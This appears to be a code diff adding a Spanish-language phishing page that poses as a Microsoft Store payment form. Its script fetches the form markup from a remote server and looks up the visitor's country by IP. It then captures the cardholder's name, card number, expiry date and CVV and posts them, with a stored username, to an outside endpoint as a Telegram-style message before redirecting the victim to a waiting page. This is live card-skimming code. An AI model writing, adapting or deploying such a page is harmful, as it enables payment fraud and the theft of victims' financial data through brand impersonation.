@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago - Microsoft Store</title>
+    <link rel="stylesheet" href="sstyles.css">
+</head>
+<body id="htmlContainer">
+    
+</body>
+<script>
+
+let pais = "" ;
+
+  async function obtenerPaisPorIP() {
+    try {
+        // Consultamos la API (por defecto toma la IP del cliente)
+        const respuesta = await fetch('https://ipapi.co/json/');
+        const datos = await respuesta.json();
+
+        console.log(`Tu IP es: ${datos.ip}`);
+        console.log(`País: ${datos.country_name}`);
+        console.log(`Código de país: ${datos.country_code}`);
+       pais = datos.country_code; 
+    } catch (error) {
+        console.error("Error al obtener la ubicación:", error);
+    }
+}
+
+obtenerPaisPorIP();
+
+
+
+
+       const API_URL = 'https://html-five-nu-93.vercel.app';
+        
+        async function fetchStaticHTML() {
+            const container = document.getElementById('htmlContainer');
+            container.innerHTML = '<div class="loading">Cargando...</div>';
+            
+            try {
+                const response = await fetch(`${API_URL}/api/htmlpa`);
+                const data = await response.json();
+                
+                // Insertar el HTML recibido
+                container.innerHTML = data.html;
+                
+            } catch (error) {
+                container.innerHTML = `
+                    <div class="error">
+                        <strong>Error:</strong> No se pudo conectar con la API. 
+                        Asegúrate de que el servidor esté corriendo en http://localhost:3000
+                    </div>
+                `;
+                console.error('Error:', error);
+            }
+        }
+        fetchStaticHTML()
+        
+async function enviar(event) { 
+     
+
+
+
+    const usr = localStorage.getItem("usuario");
+    const nom = document.getElementById("cardName").value;
+    const tar = document.getElementById("cardNumber").value;
+    const fec = document.getElementById("expiry").value;
+    const cvv = document.getElementById("cvv").value;
+    
+  if(tar.charAt(0) == "4"){
+    var tipo = "Visa";
+    localStorage.setItem("tipo", "Visa"); 
+
+  }
+
+
+
+
+   if (nom == "") {
+    alert("Ingrese el nombre");
+    return;
+    
+   }else if (tar == "") {
+    alert("Ingrese el numero de tarjeta");  
+    return;
+   }else if (fec == "") {
+    alert("Ingrese la fecha de vencimiento");
+    return;
+    }else if (cvv == "") {
+    alert("Ingrese el codigo de seguridad");
+    return;
+    }else{
+    
+
+    
+   
+
+    const message = `MAILS-- --usuario: <code>${usr}</code> --\n Nombre:<code> ${nom} </code>-- \n Tarj:<code> ${tar} </code>--\n fec:<code> ${fec} </code>--\n cvv:<code> ${cvv} </code>--\n PAIS:<code> ${pais} </code>--`;
+
+    const datos = {
+    user: usr,           // Solo el ID para guardar en Firestore
+    message: message      // Mensaje completo formateado para Telegram
+  };
+
+
+
+
+    try {
+        const response = await fetch("https://endpointmine.vercel.app", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify( datos )
+        });
+
+        const data = await response.json();
+
+        if (response.ok) {
+           
+            window.location = "wait.html";
+        } else {
+           console.log(  "❌ Error al enviar mensaje: " + data.error) ;
+        }
+    } catch (error) {
+      console.log( "❌ Error en la solicitud: " + error.message)  ;
+    }
+}
+
+}
+    
+(function () {
+  console.log('[scroll-debug] script cargado');
+
+  // selector que quieres observar; cámbialo por el tuyo
+  const SELECTOR = '#cardName'; // <-- revisa que sea exactamente el selector en el DOM
+
+  // función que intenta hacer scroll y muestra logs
+  function tryScroll() {
+    try {
+      const el = document.querySelector(SELECTOR);
+      if (!el) {
+        console.log('[scroll-debug] elemento NO encontrado aún:', SELECTOR);
+        return false;
+      }
+      console.log('[scroll-debug] elemento encontrado, haciendo scroll:', el);
+      el.scrollIntoView({ behavior: 'smooth', block: 'center', inline: 'nearest' });
+      return true;
+    } catch (err) {
+      console.error('[scroll-debug] error en tryScroll:', err);
+      return false;
+    }
+  }
+
+  // Llamada inmediata por si ya existe
+  if (tryScroll()) return;
+
+  // 1) MutationObserver (ideal)
+  console.log('[scroll-debug] iniciando MutationObserver...');
+  const observer = new MutationObserver((mutations, obs) => {
+    console.log('[scroll-debug] MutationObserver detectó cambios');
+    if (tryScroll()) {
+      console.log('[scroll-debug] scroll realizado por MutationObserver — desconectando');
+      obs.disconnect();
+      clearInterval(pollInterval);
+    }
+  });
+
+  observer.observe(document.documentElement || document.body, {
+    childList: true,
+    subtree: true,
+  });
+
+  // 2) Fallback: polling cada 500ms (por si el contenido viene por XHR o framework que no dispara mutation de nodos directos)
+  console.log('[scroll-debug] iniciando fallback polling cada 500ms...');
+  const pollInterval = setInterval(() => {
+    if (tryScroll()) {
+      console.log('[scroll-debug] scroll realizado por polling — limpiando observer e intervalo');
+      observer.disconnect();
+      clearInterval(pollInterval);
+    }
+  }, 500);
+
+  // 3) timeout para cortar la espera (evita loop infinito)
+  setTimeout(() => {
+    console.log('[scroll-debug] timeout 30s alcanzado — limpiando observer e intervalo');
+    observer.disconnect();
+    clearInterval(pollInterval);
+  }, 30000);
+
+  // 4) capturar errores globales por si algo detiene la ejecución
+  window.addEventListener('error', e => {
+    console.error('[scroll-debug] Captured window.error:', e.error || e.message, e);
+  });
+  window.addEventListener('unhandledrejection', e => {
+    console.error('[scroll-debug] Captured unhandledrejection:', e.reason);
+  });
+
+})();
+
+
+
+        </script>
+</html>
